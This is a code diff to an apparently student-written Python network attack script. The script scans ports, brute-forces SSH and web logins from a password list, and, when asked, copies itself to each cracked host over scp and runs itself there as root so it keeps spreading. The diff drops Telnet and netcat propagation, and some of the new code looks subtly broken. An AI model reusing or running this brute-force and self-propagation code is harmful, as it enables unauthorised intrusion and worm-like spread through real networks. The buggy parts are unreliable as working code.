@@ -1,37 +1,25 @@
 #!/usr/bin/python3
 
-# from scapy.all import *
-# For use when adding new functionality with scapy, be sure to statically
-# import when finished, wildcard is just for convenience.
+# Importing paramiko modules for SSH connection and exception handling.
+import pipes
 
+from paramiko import SSHClient, RejectPolicy
+from paramiko.ssh_exception import NoValidConnectionsError, SSHException
+# Importing modules from scapy for Packet Crafting and Sending / Sniffing.
 from scapy.all import get_if_addr
 from scapy.interfaces import get_if_list
 from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import sr
 from scapy.utils import subprocess, os
-from telnetlib import Telnet
+# from scapy.all import *
+# Importing sleep to allow network processes time to complete.
 from time import sleep
-from paramiko import SSHClient, RejectPolicy
+# Importing logging to safely log sensitive, error or debug info.
 import logging
+# Importing requests for web based operations.
 import requests
+# Importing strings for use of the external strings resources.
 import strings
-
-"""
- - Importing modules from scapy for Packet Crafting and Sending / Sniffing.
- - Importing telnetlib for telnet operations.
- - Importing sleep to allow network processes time to complete.
- - Importing from paramiko for ssh operations.
- - Importing logging to safely log sensitive, error or debug info.
- - Importing requests for web based operations.
- - Importing strings for use of the external strings resources.
-"""
-
-"""
-===PLEASE READ===
-Functions and methods are organised alphabetically with the exception of the
-main method specified last. Every function has a block comment explaining what
-it does.
-"""
 
 
 def additional_actions(arguments, ip, port, username,
@@ -74,11 +62,16 @@ def assigning_values(arguments):
     :return target_ports: The selection of ports to target
     :return target_username: The username that will be used for actions
     :return passwords_filename: The filename of the passwords file
+    :return None: If a runtime error occurs
     """
     if strings.ARGUMENT_IP_ADDRESS_FILENAME in arguments:
-        ip_addresses_filename = \
-            arguments[
-                arguments.index(strings.ARGUMENT_IP_ADDRESS_FILENAME) + 1]
+        try:
+            ip_addresses_filename = \
+                arguments[
+                    arguments.index(strings.ARGUMENT_IP_ADDRESS_FILENAME) + 1]
+        except RuntimeError:
+            logging.error(strings.IP_FILENAME_NOT_FOUND)
+            return None
         try:
             ip_list = convert_file_to_list(ip_addresses_filename)
             target_ports = arguments[
@@ -86,37 +79,12 @@ def assigning_values(arguments):
             target_username = \
                 arguments[arguments.index(strings.ARGUMENT_USERNAME) + 1]
             passwords_filename = \
-                arguments[arguments.index(strings.ARGUMENT_PASSWORDS_FILENAME)
+                arguments[arguments.index(strings.ARGUMENT_PWS_FILENAME)
                           + 1]
             return ip_list, target_ports, target_username, passwords_filename
         except RuntimeError:
             logging.error(strings.ip_list_not_read(ip_addresses_filename))
-            # TODO: Need to handle the exit, should be done as high up as
-            #  possible as to not interfere with test flow, ideally in main or
-            #  where-ever these functions are called
-            exit_and_show_instructions()
-
-
-def sign_in_service(ip, port, username, password_list):
-    """
-    This function will run through every password in the password list and will
-    attempt to sign in to the appropriate service with that password. It will
-    only move on to the next password in the event that the current password
-    fails in its sign in attempt. If it succeeds then the successful login
-    details are returned, if not then Null is returned
-    :param ip: The IP address to attempt to sign in to
-    :param port: The port and subsequently service we're signing in to
-    :param username: The username we're signing in to services on
-    :param password_list: The list of passwords to attempt
-    :return login_details: The username and password to return
-    :return None: Only done to indicate an unsuccessful task
-    """
-    for password in password_list:
-        login_details = (try_password_for_service(ip, port, username,
-                                                  password))
-        if login_details != strings.BLANK_STRING:
-            return login_details
-    return None
+            return None
 
 
 def check_over_ssh(ip, port, username, password):
@@ -138,71 +106,34 @@ def check_over_ssh(ip, port, username, password):
         client.set_missing_host_key_policy(RejectPolicy)
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
-        client.exec_command(strings.touch_file(os.path.basename(__file__)))
-        if str(client.exec_command
-                (strings.cat_file(os.path.basename(__file__)))
-               [1]).__len__() < 1:
+        if strings.touch_file(strings.MAIN_FILENAME) == "touch main.py":
+            client.exec_command(pipes.quote(strings.
+                                            touch_file(strings.MAIN_FILENAME)))
+        else:
+            logging.error(strings.SANITATION_FAILED)
             client.close()
-            return True
+            return False
+        if strings.cat_file(strings.MAIN_FILENAME) == "cat main.py":
+            if str(client.exec_command(pipes.quote(strings.cat_file(
+                    strings.MAIN_FILENAME)))[1]).__len__() < 1:
+                client.close()
+                return True
+
+        logging.error(strings.SANITATION_FAILED)
         client.close()
         return False
 
-    except RuntimeError:
+    except NoValidConnectionsError:
         client.close()
         return True
 
-
-def check_over_telnet(ip, port, username, password):
-    """
-    This function checks if the current script is already located at the
-    target machine over telnet. If it is then false is returned and if not then
-    true is returned. This is needed as a prerequisite to propagating over
-    telnet
-    :param ip: The IP address target for Telnet
-    :param port: The port on which we're running Telnet
-    :param username: The username to target over Telnet
-    :param password: Password to use with Telnet
-    :return True: If the file doesn't exist on the target host or there's a
-    problem with Telnet (assuming file isn't present essentially)
-    :return False: If the file does exist
-    """
-    try:
-        tel = Telnet(host=ip, port=port, timeout=2)
-        tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(username) + strings.RETURN_OR_NEWLINE)
-                  .encode(strings.ENCODE_ASCII))
-        tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(password) + strings.RETURN_OR_NEWLINE)
-                  .encode(strings.ENCODE_ASCII))
-        data = tel.read_until(strings.WELCOME_TO.encode(strings.ENCODE_ASCII),
-                              timeout=4)
-        if check_telnet_data(strings.WELCOME_TO, data):
-            tel.write(strings.cat_file(os.path.basename(__file__) +
-                                       strings.RETURN_OR_NEWLINE)
-                      .encode(strings.ENCODE_ASCII))
-            data = tel.read_until(strings.MAIN.encode(strings.ENCODE_ASCII),
-                                  timeout=4)
-            if data.__contains__(strings.MAIN.encode(strings.ENCODE_ASCII)):
-                return False
-            return True
-        return False
-
-    except RuntimeError:
-        return False
-
-
-def check_telnet_data(string_to_check, data):
-    """
-    This function checks data gathered from the telnet service for a specific
-    string and returns True if it finds it and false if it doesn't
-    :param string_to_check: The string to find in the Telnet data
-    :param data: The telnet data itself
-    :return True: The string was found in the telnet data
-    :return False: The string was not found in the telnet data
-    """
-    if data.__contains__(string_to_check.encode(strings.ENCODE_ASCII)):
+    except TimeoutError:
+        client.close()
         return True
-    return False
+
+    except SSHException:
+        client.close()
+        return True
 
 
 def checking_arguments(arguments):
@@ -216,6 +147,7 @@ def checking_arguments(arguments):
     :return values[1]: Ports and subsequently services to target
     :return values[2]: Username to target
     :return values[3]: Filename for a file containing passwords
+    :return None: If the values can't be assigned.
     """
     if ((strings.ARGUMENT_IP_ADDRESS_FILENAME or
          strings.ARGUMENT_SCAN_LOCAL_NETWORKS in arguments) and
@@ -225,14 +157,16 @@ def checking_arguments(arguments):
             arguments):
         try:
             values = assigning_values(arguments)
-            return values[0], values[1], values[2], values[3]
-
+            if values is not None:
+                return values[0], values[1], values[2], values[3]
+            logging.error(strings.FAILED_ASSIGNING_VALUES)
+            return None
         except RuntimeError:
             logging.error(strings.FAILED_ASSIGNING_VALUES)
-            exit_and_show_instructions()
+            return None
     else:
         logging.error(strings.PARAMETER_MISUSE)
-        exit_and_show_instructions()
+        return None
 
 
 def connect_ssh_client(ip, port, username, password):
@@ -256,45 +190,9 @@ def connect_ssh_client(ip, port, username, password):
                                                strings.SUCCESSFUL))
         return True
 
-    except RuntimeError:
+    except SSHException:
         client.close()
         logging.debug(strings.connection_status(strings.SSH, ip, port,
-                                                strings.UNSUCCESSFUL))
-        return False
-
-
-def connect_telnet(ip, port, username, password):
-    """
-    This function checks to see if a telnet connection can be established and
-    if so then it returns true, if not then it returns false
-    :param ip: The target IP address for Telnet
-    :param port: The target port for Telnet
-    :param username: The target username for Telnet
-    :param password: The target password for Telnet
-    :return True: If the Telnet connect is successful
-    :return False: If the Telnet connect is unsuccessful
-    """
-    try:
-        tel = Telnet(host=ip, port=port, timeout=2)
-        tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(username) + strings.RETURN_OR_NEWLINE)
-                  .encode(strings.ENCODE_ASCII))
-        tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(password) + strings.RETURN_OR_NEWLINE)
-                  .encode(strings.ENCODE_ASCII))
-
-        data = tel.read_until(strings.WELCOME_TO.encode(strings.ENCODE_ASCII),
-                              timeout=4)
-        logging.info(strings.connection_status(strings.TELNET, ip, port,
-                                               strings.SUCCESSFUL))
-        if check_telnet_data(strings.WELCOME_TO, data):
-            return True
-        logging.debug(strings.connection_status(strings.TELNET, ip, port,
-                                                strings.UNSUCCESSFUL))
-        return False
-
-    except RuntimeError:
-        logging.debug(strings.connection_status(strings.TELNET, ip, port,
                                                 strings.UNSUCCESSFUL))
         return False
 
@@ -305,10 +203,10 @@ def connect_web(ip, port, username, password):
     it returns true, if not then it returns false
     :param ip: The target IP address for web login
     :param port: The target port for web login
-    :param username: The target username for Telnet
-    :param password: The target password for Telnet
-    :return True: If the Telnet connect is successful
-    :return False: If the Telnet connect is unsuccessful
+    :param username: The target username for web login
+    :param password: The target password for web login
+    :return True: If the web login is successful
+    :return False: If the web login connect is unsuccessful
     """
     attempt_succeeded = False
     try:
@@ -378,10 +276,7 @@ def file_not_exist(ip, port, username, password):
     :param password: Password being used as part of checking the file
     :return check_over_ssh(ip, port, username, password):
     """
-    if str(port) == strings.SSH_PORT:
-        return check_over_ssh(ip, port, username, password)
-
-    return check_over_telnet(ip, port, username, password)
+    return check_over_ssh(ip, port, username, password)
 
 
 def gathering_local_ips(ip_list):
@@ -393,8 +288,9 @@ def gathering_local_ips(ip_list):
     """
     logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
     local_interfaces = get_if_list()
+    if strings.LOOPBACK in local_interfaces:
+        local_interfaces = local_interfaces.remove(strings.LOOPBACK)
     for interface in local_interfaces:
-        # TODO: Maybe remove the loopback interface before running for loop?
         if str(interface) != strings.LOOPBACK:
             logging.info(strings.fetching_ips_for_interface(interface))
             ip_list.extend(cycle_through_subnet(ip_list, interface))
@@ -405,7 +301,7 @@ def exit_and_show_instructions():
     """
     This function will print the help screen and show an exit prompt.
     """
-    print(strings.PLS_HELP)
+    print(strings.help_output())
     print(strings.EXITING)
 
 
@@ -438,11 +334,10 @@ def propagate_script(ip, port, login_string):
     """
     This function is responsible for propagating the network_attack.py to a
     previously bruteforce machine. It will only run when the user specifies
-    using the appropriate argument and when the port being bruteforce is
-    either 22 (SSH) and 23 (telnet), it will also check to ensure the script
-    isn't  already present on the target. It goes about propagating the script
-    in different ways depending on if an SSH port or a telnet port is
-    specified
+    using the appropriate argument and when the port being bruteforce is 22
+    (SSH), it will also check to ensure the script isn't  already present on
+    the target. It goes about propagating the script in different ways
+    depending on if an SSH port is specified
     :param ip: The IP address we wish to propagate the script to
     :param port: The port through which we'll propagate the script
     :param login_string: This string contains the username and password for the
@@ -454,59 +349,38 @@ def propagate_script(ip, port, login_string):
     try:
         if file_not_exist(ip, port, login_string_split[0],
                           login_string_split[1]):
-            if str(port) == strings.SSH_PORT:
-                # TODO: Need feedback from the end user, should be worked into
-                #  the UI itself. Not a dedicated print statement.
-                print(strings.RSA_AND_PROMPT)
-                os.system(strings.scp_command_string(port,
-                                                     login_string_split[0],
-                                                     ip,
-                                                     os.path
-                                                     .basename(__file__)))
-                print(strings.RSA_PROMPT_AGAIN)
-                os.system(strings.scp_command_string(port,
-                                                     login_string_split[0],
-                                                     ip,
-                                                     strings.PASSWORDS_FILE))
-                client = SSHClient()
-                try:
-                    client.set_missing_host_key_policy(RejectPolicy)
-                    client.connect(hostname=str(ip), port=int(port),
-                                   username=str(login_string_split[0]),
-                                   password=str(login_string_split[1]))
-                    client.exec_command(strings.run_script_command(
-                        os.path.basename(__file__), login_string_split[0]))
-                    client.close()
-                    return True
-
-                except RuntimeError:
+            print(strings.RSA_AND_PROMPT)
+            os.system(strings.scp_command_string(port,
+                                                 login_string_split[0],
+                                                 ip,
+                                                 os.path
+                                                 .basename(__file__)))
+            print(strings.RSA_PROMPT_AGAIN)
+            os.system(strings.scp_command_string(port,
+                                                 login_string_split[0],
+                                                 ip,
+                                                 strings.PWDS_LIST))
+            client = SSHClient()
+            try:
+                client.set_missing_host_key_policy(RejectPolicy)
+                client.connect(hostname=str(ip), port=int(port),
+                               username=str(login_string_split[0]),
+                               password=str(login_string_split[1]))
+                if strings.run_script_command() == "./main.py -L -p 22 -u " \
+                                                   "root -f " \
+                                                   "src/test_files/" \
+                                                   "passwords_list.txt -P":
+                    client.exec_command(pipes.quote(
+                        strings.run_script_command()))
+                else:
+                    logging.error(strings.SANITATION_FAILED)
                     client.close()
                     return False
-            tel = Telnet(host=ip, port=port, timeout=2)
-            tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
-            tel.write((str(login_string_split[0]) + strings
-                       .RETURN_OR_NEWLINE).encode(
-                strings.ENCODE_ASCII))
-            tel.read_until(strings.PASSWORD_PROMPT.encode(
-                strings.ENCODE_ASCII))
-            tel.write((str(login_string_split[1]) +
-                       strings.RETURN_OR_NEWLINE).encode(strings.ENCODE_ASCII))
-            tel.write((strings.netcat_listener(port,
-                                               os.path.basename(__file__)))
-                      .encode(strings.ENCODE_ASCII))
-            os.system((strings.netcat_writer(ip, port,
-                                             os.path.basename(__file__)))
-                      .encode(strings.ENCODE_ASCII))
-            tel.write((strings.netcat_listener(port,
-                                               strings.PASSWORDS_FILE))
-                      .encode(strings.ENCODE_ASCII))
-            os.system((strings.netcat_writer(ip, port,
-                                             strings.PASSWORDS_FILE))
-                      .encode(strings.ENCODE_ASCII))
-            tel.write((strings.run_script_command(os.path.basename(__file__),
-                                                  login_string_split[0]))
-                      .encode(strings.ENCODE_ASCII))
-            return True
+                client.close()
+                return True
+            except RuntimeError:
+                client.close()
+                return False
         else:
             logging.debug(strings.file_present_on_host(ip))
             return False
@@ -568,27 +442,29 @@ def send_post_request_with_login(ip, port, username, password):
         logging.info(strings.connection_status(strings.WEB, ip, port,
                                                strings.SUCCESSFUL))
         return str(username) + strings.COLON + str(password)
-    else:
-        logging.debug(strings.connection_status(strings.WEB, ip, port,
-                                                strings.UNSUCCESSFUL))
-        return None
+    logging.debug(strings.connection_status(strings.WEB, ip, port,
+                                            strings.UNSUCCESSFUL))
+    return None
 
 
-def telnet_connection(ip, port, username, password):
+def sign_in_service(ip, port, username, password_list):
     """
-    This function will try to establish a telnet connection, if it does it will
-    return the successful telnet login string and if not then it will return a
-    null value
-    :param ip: The target IP address for the telnet connection
-    :param port: The target port for the telnet connection
-    :param username: The target username for the telnet connection
-    :param password: The target password for the telnet connection
-    :return str(username) + strings.COLON + str(password): The successful login
-    string
-    :return None: If the telnet connection is unsuccessful
+    This function will run through every password in the password list and will
+    attempt to sign in to the appropriate service with that password. It will
+    only move on to the next password in the event that the current password
+    fails in its sign in attempt. If it succeeds then the successful login
+    details are returned, if not then Null is returned
+    :param ip: The IP address to attempt to sign in to
+    :param port: The port and subsequently service we're signing in to
+    :param username: The username we're signing in to services on
+    :param password_list: The list of passwords to attempt
+    :return login_details: The username and password to return
+    :return None: Only done to indicate an unsuccessful task
     """
-    if connect_telnet(ip, port, username, password):
-        return str(username) + strings.COLON + str(password)
+    for password in password_list:
+        login_details = try_password_for_service(ip, port, username, password)
+        if login_details is not False:
+            return login_details
     return None
 
 
@@ -597,7 +473,7 @@ def transfer_file(ip, port, login_string, transfer_file_filename):
     This function will transfer a given file if the end user has provided the
     appropriate argument, and only when bruteforce login details are found for
     either tenet or SSH. It handles the transfer of this file differently
-    depending on whether the port value given is an SSH port or a telnet port
+    depending on whether the port value given is an SSH port
     :param ip: The IP address to which the file should be transferred
     :param port: The port over which the file should be transferred
     :param login_string: The username and password needed for the transfer of
@@ -608,23 +484,9 @@ def transfer_file(ip, port, login_string, transfer_file_filename):
     """
     login_string_split = login_string.split(strings.COLON)
     try:
-        if str(port) == strings.SSH_PORT:
-            print(strings.RSA_AND_PROMPT)
-            os.system(strings.scp_command_string(port, login_string_split[0],
-                                                 ip, transfer_file_filename))
-            return True
-
-        tel = Telnet(host=ip, port=port, timeout=2)
-        tel.read_until(strings.LOGIN_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(login_string_split[0]) +
-                   strings.RETURN_OR_NEWLINE).encode(strings.ENCODE_ASCII))
-        tel.read_until(strings.PASSWORD_PROMPT.encode(strings.ENCODE_ASCII))
-        tel.write((str(login_string_split[1]) + strings.RETURN_OR_NEWLINE)
-                  .encode(strings.ENCODE_ASCII))
-        tel.write((strings.netcat_listener(port, transfer_file_filename) +
-                   "\n").encode(strings.ENCODE_ASCII))
-        os.system((strings.netcat_writer(ip, port, transfer_file_filename) +
-                   "\n").encode(strings.ENCODE_ASCII))
+        print(strings.RSA_AND_PROMPT)
+        os.system(strings.scp_command_string(port, login_string_split[0],
+                                             ip, transfer_file_filename))
         return True
     except ConnectionRefusedError:
         return False
@@ -646,7 +508,6 @@ def try_action(ip, port, target_username, password_list,
     :param transfer_file_filename: A filename for file to transfer
     :param arguments: List of user specified arguments
     """
-    logging.info(strings.TESTING_IP_PORT_PAIR)
     if scan_port(ip, port):
         logging.info(strings.FOUND_OPEN_IP_PORT_PAIR)
         action_login_details = try_sign_in(ip, port, target_username,
@@ -676,7 +537,6 @@ def try_sign_in(ip, port, target_username, password_list):
     """
     service_switch = {
         strings.SSH_PORT: strings.SSH_LOWERCASE,
-        strings.TELNET_PORT: strings.TELNET,
         strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
         strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
         strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
@@ -686,8 +546,7 @@ def try_sign_in(ip, port, target_username, password_list):
     if sign_in_details:
         logging.info(strings.working_username_password(service))
         return str(sign_in_details), service
-    else:
-        logging.debug(strings.IMPOSSIBLE_ACTION)
+    logging.debug(strings.IMPOSSIBLE_ACTION)
     return None, service
 
 
@@ -708,8 +567,6 @@ def try_password_for_service(ip, port, username, password):
         connect_service_switch = {
             strings.SSH_PORT: lambda: connect_ssh_client(ip, port, username,
                                                          password),
-            strings.TELNET_PORT: lambda: connect_telnet(ip, port, username,
-                                                        password),
             strings.WEB_PORT_EIGHTY: lambda: connect_web(ip, port, username,
                                                          password),
             strings.WEB_PORT_EIGHTY_EIGHTY: lambda: connect_web(ip, port,
@@ -721,10 +578,10 @@ def try_password_for_service(ip, port, username, password):
         connect_service = connect_service_switch.get(str(port))
         if connect_service():
             return str(username) + strings.COLON + str(password)
-        return strings.BLANK_STRING
+        return False
 
     except RuntimeError:
-        return strings.BLANK_STRING
+        return False
 
 
 def try_propagating(arguments, ip, port, bruteforce):
@@ -740,8 +597,7 @@ def try_propagating(arguments, ip, port, bruteforce):
     :param port: The port we're propagating through
     :param bruteforce: The username and password string combo
     """
-    if strings.ARGUMENT_PROPAGATE in arguments and (port == strings.SSH_PORT
-                                                    or strings.TELNET_PORT):
+    if strings.ARGUMENT_PROPAGATE in arguments and (port == strings.SSH_PORT):
         propagated = propagate_script(ip, port, bruteforce)
         if propagated:
             logging.info(strings.SCRIPT_PROPAGATED)
@@ -767,13 +623,13 @@ def try_transferring_file(arguments, ip, port, bruteforce,
     :param transfer_file_filename: The filename of the file we wish to transfer
     """
     if strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE in arguments and \
-            (str(port) == strings.SSH_PORT or strings.TELNET_PORT):
+            (str(port) == strings.SSH_PORT):
         transferred = transfer_file(ip, port, bruteforce,
                                     transfer_file_filename)
         if transferred:
-            logging.info(strings.TRANSFER_SUCCESS_SSH_TELNET)
+            logging.info(strings.TRANSFER_SUCCESS_SSH)
         else:
-            logging.debug(strings.TRANSFER_FAILURE_SSH_TELNET)
+            logging.debug(strings.TRANSFER_FAILURE_SSH)
     else:
         logging.info(strings.DO_NOT_TRANSFER)
 
